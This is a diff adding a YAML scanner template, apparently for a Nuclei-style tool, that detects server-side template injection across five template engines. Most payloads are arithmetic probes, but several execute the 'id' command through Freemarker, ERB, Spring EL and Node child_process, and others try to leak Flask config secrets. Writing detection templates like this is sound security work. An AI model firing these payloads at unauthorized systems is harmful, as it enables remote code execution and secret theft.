@@ -1,0 +1,81 @@
+id: ssti-basic
+info:
+  name: "Server-Side Template Injection"
+  severity: critical
+  description: >
+    템플릿 엔진이 사용자 입력을 그대로 렌더링할 때 발생하는 취약점.
+    수식 계산 결과가 응답에 반사되면 취약점으로 판정.
+  references:
+    - https://portswigger.net/research/server-side-template-injection
+  tags: [ssti, injection, rce]
+
+definition:
+  method: [GET, POST]
+  position: [query, body, form_field]
+
+# 공격 방식별 페이로드 그룹 분류
+payload_groups:
+  - group: jinja2_twig
+    engine: "Jinja2 / Twig"
+    payloads:
+      - "{{7*7}}"           # 기본 산술 (결과: 49)
+      - "{{7*'7'}}"         # 문자열 곱셈 Jinja2 (결과: 7777777)
+      - "{{config}}"        # 설정 노출 시도
+      - "{{''.__class__.__mro__}}"  # Python 클래스 체인
+
+  - group: freemarker_thymeleaf
+    engine: "Freemarker / Thymeleaf"
+    payloads:
+      - "${7*7}"             # 기본 산술 (결과: 49)
+      - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+
+  - group: ruby_erb
+    engine: "Ruby ERB"
+    payloads:
+      - '#{7*7}'             # 기본 산술 (결과: 49)
+      - "<%= 7*7 %>"         # ERB 태그 (결과: 49)
+      - "<%= `id` %>"        # 명령 실행 시도
+
+  - group: spring_el
+    engine: "Spring Expression Language"
+    payloads:
+      - "*{7*7}"             # Spring EL (결과: 49)
+      - "*{T(java.lang.Runtime).getRuntime().exec('id')}"
+
+  - group: ejs_node
+    engine: "EJS / Node.js"
+    payloads:
+      - "<%= 7*7 %>"         # EJS (결과: 49)
+      - "<%= require('child_process').execSync('id') %>"
+
+# matchers-condition: or → 하나라도 매칭되면 취약점 판정
+matchers_condition: or
+
+matchers:
+  - type: regex
+    name: arithmetic_result_49
+    description: "7*7 = 49 계산 결과 반사 확인 (앞뒤 숫자 없이 단독)"
+    regex:
+      - "(?<![0-9])49(?![0-9])"
+
+  - type: regex
+    name: string_multiplication_result
+    description: "7*'7' = 7777777 문자열 곱셈 결과 (Jinja2 특이 동작)"
+    regex:
+      - "7777777"
+
+  - type: regex
+    name: python_class_chain
+    description: "Python 객체 체인 노출 (클래스 정보 반사)"
+    regex:
+      - "<class '.*'>"
+      - "__mro__"
+      - "__subclasses__"
+
+  - type: regex
+    name: config_object_leak
+    description: "Flask/Jinja2 config 객체 노출"
+    regex:
+      - "<Config \\{"
+      - "SECRET_KEY"
+      - "SQLALCHEMY_DATABASE_URI"
